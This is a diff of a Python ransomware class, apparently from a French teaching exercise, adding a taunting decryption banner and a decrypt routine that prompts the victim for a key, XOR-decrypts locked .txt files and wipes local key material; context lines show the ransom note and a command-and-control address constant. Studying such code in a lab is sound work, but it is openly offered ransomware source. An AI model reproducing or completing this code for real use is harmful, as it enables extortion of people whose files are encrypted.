@@ -45,6 +45,33 @@ Vos fichiers txt ont été verrouillés. Envoyez un e-mail à ilnefautpasavoirpe
 Comme vous faite partie de nos fidèles clients, voici un code de réduction de 20euros sur votre prochaine commande """.join(random.choice(string.ascii_lowercase) for i in range(5))
 """.
 """
+DECRYPT_MESSAGE = """
+        ⠀⠀⠀⠀⠀⢀⣀⣀⣴⣆⣠⣤⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣻⣿⣯⣘⠹⣧⣤⡀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⢿⣿⣷⣾⣯⠉⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠜⣿⡍⠀⠀⠀⠀⠀⠀⠀
+    :-------@@@@------------------------@@@@---------:
+    :                                                :
+    :      La prochaine fois, téléchargez avast      :
+    :  anti virus afin de protéger votre ordinateur  :
+    : +Nord VPN avec mon code : Nevergonnagiveyouup  :
+    :................................................:
+⠀⠀⠀⠀⠀⠀⠀⣿⣿⠁⠀⠀⢰⣿⣿⣯⠁⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣷⡄⠀
+⠀⠀⣀⣤⣴⣶⣶⣿⡟⠀⠀⠀⢸⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⠀
+⠀⢰⣿⡟⠋⠉⣹⣿⡇⠀⠀⠀⠘⣿⣿⣿⣿⣷⣦⣤⣤⣤⣶⣶⣶⣶⣿⣿⣿⠀
+⠀⢸⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀
+⠀⣸⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠉⠻⠿⣿⣿⣿⣿⡿⠿⠿⠛⢻⣿⡇⠀⠀
+⠀⣿⣿⠁⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣧⠀⠀
+⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀
+⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀
+⠀⢿⣿⡆⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀
+⠀⠸⣿⣧⡀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠃⠀⠀
+⠀⠀⠛⢿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⣰⣿⣿⣷⣶⣶⣶⣶⠶⠀⢠⣿⣿⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⣽⣿⡏⠁⠀⠀⢸⣿⡇⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⢹⣿⡆⠀⠀⠀⣸⣿⠇⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢿⣿⣦⣄⣀⣠⣴⣿⣿⠁⠀⠈⠻⣿⣿⣿⣿⡿⠏⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠈⠛⠻⠿⠿⠿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+"""
 class Ransomware:
     def __init__(self) -> None:
         self.check_hostname_is_docker()
@@ -89,8 +116,41 @@ class Ransomware:
 
 
     def decrypt(self):
-        # main function for decrypting (see PDF)
-        raise NotImplemented()
+        # Fonction principale de déchiffrement (voir le PDF)
+
+        # Création d'une instance de SecretManager
+        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
+
+        # Chargement des éléments cryptographiques locaux
+        secret_manager.load()
+
+        # Récupération de la liste des fichiers .txt
+        received_files = self.get_files("*.txt")
+
+        while True:
+            try:
+                # Demande de la clé de déchiffrement à l'utilisateur
+                candidate_key = input("Entrez votre clé")
+
+                # Appel de la fonction set_key de SecretManager pour définir la clé
+                secret_manager.set_key(candidate_key)
+
+                # Appel de la fonction xorfiles de SecretManager pour déchiffrer les fichiers
+                secret_manager.xorfiles(received_files)
+
+                # Appel de la fonction clean de SecretManager pour supprimer les éléments cryptographiques locaux
+                secret_manager.clean()
+
+                # Affichage du message de réussite du déchiffrement
+                print(DECRYPT_MESSAGE,"Félicitation, voici un code de réduction de 1 euros pour la prochaine fois".join(random.choice(string.ascii_lowercase) for i in range(5)))
+
+                # Sortie de la boucle
+                break
+
+            except ValueError as err:
+                # Affichage du message d'erreur
+                print("Error",{err},"Clé invalide, contactez notre support en ligne en cas de problème.")
+
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG)
